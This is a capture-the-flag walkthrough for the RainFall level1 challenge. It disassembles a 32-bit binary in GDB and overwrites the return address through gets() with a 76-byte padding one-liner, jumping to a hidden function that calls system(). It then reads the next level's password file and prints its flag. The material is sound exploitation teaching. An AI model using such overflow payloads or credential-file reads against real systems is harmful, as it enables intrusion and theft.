# level1

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

Go to:
- [The binary](#the-binary): some analysis
- [Buffer overflow](#buffer-overflow): how to solve this level

## The binary

First, execute `level1` and play with it a little:

```console
level1@RainFall:~$ ./level1
ashaiuhsoiahsioahisoaoishoiasioahsoiaoisnaoinsoiansoiansoinaiosnaoinsoihfoahsoinasoidhiuawhdowdgligalugaidgalkgdgdiasgdias
Segmentation fault (core dumped)
```

Putting a lot of crap makes `level1` segfaulting that is to say it is not protected somewhere. Let's check what is
inside this binary `level1`:

```gdb
level1@RainFall:~$ gdb level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

So, we notice several functions such as: `main`, `run`, `gets`, `fwrite` and so on. Let's have a look at `main`:

```gdb
Dump of assembler code for function main:
   0x08048480 <+0>:    push   ebp                      ; Stack frame
   0x08048481 <+1>:    mov    ebp,esp                  ; initialization.
   0x08048483 <+3>:    and    esp,0xfffffff0           ; Stack frame alignment: rounding down to the nearest multiple of 16. 
   0x08048486 <+6>:    sub    esp,0x50                 ; Create the frame of size 0x50 (decimal 80).
   0x08048489 <+9>:    lea    eax,[esp+0x10]           ; The actual buffer starts at esp+0x10 (decimal 16).
   0x0804848d <+13>:   mov    DWORD PTR [esp],eax      ; The pointer to the beginning of the pointer will be the parameter of `<gets>`.
   0x08048490 <+16>:   call   0x8048340 <gets@plt>     ; Calling `<gets>`.
   0x08048495 <+21>:   leave
   0x08048496 <+22>:   ret
End of assembler dump.
```

Well, now we know more about `main`, if you dig into `gets` you will notice that it calls `_IO_getline` - thus a prompt
waiting for you to enter something followed by `return`. But, it is not significant for us here. We notice that function
`run` is never called! To convince yourself, just put a breakpoint onto this function and run. The program run as usual.

So, let's have a look at it:

```gdb
gdb-peda$ disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18                     ; The stack frame is 0x18 (decimal 24) bytes big.
   0x0804844a <+6>:     mov    eax,ds:0x80497c0
   0x0804844f <+11>:    mov    edx,eax
   0x08048451 <+13>:    mov    eax,0x8048570
   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:    call   0x8048360 <system@plt>       ; That is interesting! It calls `system`.
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
```

Well, well, well. We have a call to `system` which executes code without other any checking. That's our entry point. Now
we are going to use one famous hacker technic: the *buffer overflow*.

## Buffer overflow

In order to do so we are going to use the buffer initialize in `main`. The objectives are clear: thanks to `gets` we can
buffer overflow the `main` function and put afterwards a call to `run` (which starts at `0x08048444`).

To do so, we need to calculate the offset in order to override the `EIP` address. We are going to make it point to `run`
function. Thanks to this [online
tool](http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) we know that the offset is of
76.

Let's create our string with 76 `A` and the address (the address is inverse because of the endianness):

```console
level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/level1
```

And give it to `level1` executable:

```console
level1@RainFall:~$ cat /tmp/level1 - | ./level1
```

> `$ cat [file] -` means that `cat` open the file then stdin (`-`).

Finally:

```console
level1@RainFall:~$ cat /tmp/test - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
